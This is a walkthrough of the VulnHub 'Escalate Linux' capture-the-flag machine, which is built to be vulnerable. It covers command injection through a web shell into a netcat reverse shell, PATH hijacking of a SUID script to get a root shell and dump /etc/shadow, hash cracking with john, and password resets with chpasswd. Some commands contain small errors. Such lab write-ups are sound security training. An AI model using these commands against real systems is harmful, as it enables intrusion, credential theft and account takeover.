---
title: "Escalate Linux"
date: 2024-06-19
draft: false
summary: "Writeup for Escalate Linux CTF challenge on VulnHub."
tags: ["linux", "suid", "injection"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/escalate_linux/cover.webp"
  caption: "Escalate Linux VulnHub Challenge"
  alt: "Escalate Linux cover"
platform: "VulnHub"
---

*Escalate Linux* is an intentionally vulnerable linux machine designed to explore various post exploitation attack scenarios.
<!--more-->
You can download *Escalate Linux* by clicking on the link given below:
- https://www.vulnhub.com/entry/escalate_linux-1,323

> **Note**: The IP address of my machines change throughout the walkthrough because I worked on them in different locations. Please bear with me as you follow along.

## Recon

After setting up the target locally, I scanned the network to identify its IP using **nmap**

```bash
nmap -sn 192.168.1.0/24                  
```

I then scanned the target to find open ports and the services running on them.

```shell
nmap -A -p- 192.168.1.18 --min-rate 10000 -oN nmap.out
```

| **Port** | **Service** |
| -------- | ----------- |
| 80       | http        |
| 111      | rpcbinder   |
| 139      | netbios     |
| 445      | smb         |
| 2049     | nfs         |

![](https://cdn.ziomsec.com/escalate_linux/1.webp)
![](https://cdn.ziomsec.com/escalate_linux/2.webp)

## Initial Foothold

### Gaining Shell

I accessed the HTTP server running on the target and landed on *Apache*'s default landing page.

![](https://cdn.ziomsec.com/escalate_linux/3.webp)

Since there was nothing of interest on the landing page, I looked for hidden files using **ffuf** and found a **php** file.

```shell
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,302
```

![](https://cdn.ziomsec.com/escalate_linux/4.webp)

Accessing the file revealed that it required a parameter called *cmd*.

```shell
curl http://target/shell.php
```

![](https://cdn.ziomsec.com/escalate_linux/5.webp)

To test out the *cmd* parameter, I sent another request by appending a shell command and got an interesting response from the target.

```shell
curl -X GET http://target/shell.php?cmd=whoami
```

![](https://cdn.ziomsec.com/escalate_linux/6.webp)

The value being passed in the *cmd* parameter was being executed by the server and its result was being returned in the response. I leveraged this to first verify if the target had **netcat** and **bash** shell and then got a reverse shell.

```shell
curl -X GET http://attacker/shell.php?cmd=which+nc
curl -X GET http://attacker/shell.php?cmd=which+bash
```

![](https://cdn.ziomsec.com/escalate_linux/7.webp)

> You can get the reverse shell payload from **[revshells](https://www.revshells.com/)**. 

```shell
# start a netcat listener
rlwrap nc -lnvp 4444

# on another terminal, use command injection to get reverse shell
curl -x GET http://attacker/shell.php?cmd={REVSHELL_NC-MKFIFO_PAYLOAD} # URL encode the payload
```

![](https://cdn.ziomsec.com/escalate_linux/8.webp)

After the payload was executed on the target, I got a reverse shell on my **netcat** listener.

![](https://cdn.ziomsec.com/escalate_linux/9.webp)

### Spawning TTY

Since I was still a service user, I tried spawning a **TTY** shell using **python**.

> reference: [sushant747.gitbook.io](https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html)

```shell
# verify python binary
which python
# spawn tty
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn.ziomsec.com/escalate_linux/10.webp)

## Privilege Escalation

### Uncommon SUID

I used the following command to find files in the machine owned by root and with SUID bit.

```bash
find / -user root -perm -u=s -ls 2>/dev/null
```

I found 2 interesting files: *script* and *shell*.

![](https://cdn.ziomsec.com/escalate_linux/11.webp)

**USING `/USER3/SHELL`**
I executed the **shell** program in the */home/user3/* directory and gained root access.

```shell
cd /home/user3/
./shell
```

![](https://cdn.ziomsec.com/escalate_linux/12.webp)

**MODIFYING THE `/USER5/SCRIPT` FILE**
I executed the **script** program present in the *user5* directory and obtained results similar to the `ls` command.

```shell
cd /home/user5/
./script
```

![](https://cdn.ziomsec.com/escalate_linux/13.webp)

> You can also use **[pspy](https://github.com/DominicBreuker/pspy)** to monitor the processes.

I created a script that ran **bash** in privileged mode and named it `ls`.

```shell
#!/bin/bash
/bin/bash -p
```

![](https://cdn.ziomsec.com/escalate_linux/14.webp)

I then added the directory where I stored this in the `PATH` variable. Since this path was appended at the start, anytime the system looked for `ls` without it's complete path, it would find it here itself and would hence execute **bash** in privileged mode.

```shell
export PATH=tmp:$PATH
```

![](https://cdn.ziomsec.com/escalate_linux/15.webp)

![](https://cdn.ziomsec.com/escalate_linux/16.webp)

Finally, I executed the script.

![](https://cdn.ziomsec.com/escalate_linux/17.webp)

### Cracking Root Password

Since the `/user5/script` executed the **`ls`** command, I created a new script called **`ls`** in the */tmp* directory with a command to read the shadow file. Then, I added the */tmp* directory to my path variable.

```shell
cd /tmp
echo '#!/bin/bash' > ls
echo 'cat /etc/shadow' >> ls
export PATH=/tmp:$PATH
```

![](https://cdn.ziomsec.com/escalate_linux/18.webp)

Finally, I gave this file execution permission, ran **/home/user5/script** and got a root password.

```shell
chmod +x ls
/home/user5/script
```

![](https://cdn.ziomsec.com/escalate_linux/19.webp)

**`$6$`** indicates the usage of **SHA-512** hash. I copied the password field on my system and used **john** to crack it.

```shell
echo 'HASH' > linpass
john linpass
```

![](https://cdn.ziomsec.com/escalate_linux/20.webp)

I then switched to *root* using **su**

```shell
su root
# enter password
```

![](https://cdn.ziomsec.com/escalate_linux/21.webp)

### Using `user1` Privs

I utilized the **`ls`** binary to change the password of *user1* using the */home/user5/script*.

```shell
echo '#!/bin/bash' > ls
echo 'echo "user1:PASSWORD" | chpasswd' >> ls
export PATH=/tmp:$PATH
```

![](https://cdn.ziomsec.com/escalate_linux/22.webp)

Executing the script allowed me to switch to *user1*.

```shell
chmod +x ls
/home/user5/script
su user1
# enter new PASSWORD
```

![](https://cdn.ziomsec.com/escalate_linux/23.webp)

I then viewed *user1*'s **sudo** privileges and found that I could run any command as root.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/escalate_linux/24.webp)

Hence, I switched to *root*.

```shell
sudo su
```

![](https://cdn.ziomsec.com/escalate_linux/25.webp)

### Using `/etc/passwd` Read Perm

I read the `/etc/passwd` file and found that *user7* was part of the root group. Hence, I used */home/user5/script* to change the password of *user7* and switched.

```shell
tail /etc/passwd
```

![](https://cdn.ziomsec.com/escalate_linux/26.webp)

```shell
echo '#!/bin/bash' > ls
echo 'echo "user7:PASSWORD" | chpasswd' >> ls
chmod +x ls
export PATH=/tmp:$PATH
/user/user5/script
```

![](https://cdn.ziomsec.com/escalate_linux/27.webp)

Finally, I switched user and got privileged access.

```shell
su user7
# enter new PASSWORD
```

![](https://cdn.ziomsec.com/escalate_linux/28.webp)

# Closure

Getting initial access on the system was fairly simple; I just used the command injection vulnerability to get a reverse shell. As for the privilege escalation, I demonstrated 4 methods:
1. Exploiting uncommon SUID bit
2. Cracking root password
3. Misconfigured users

That's it from my side :)
Happy Hacking!

---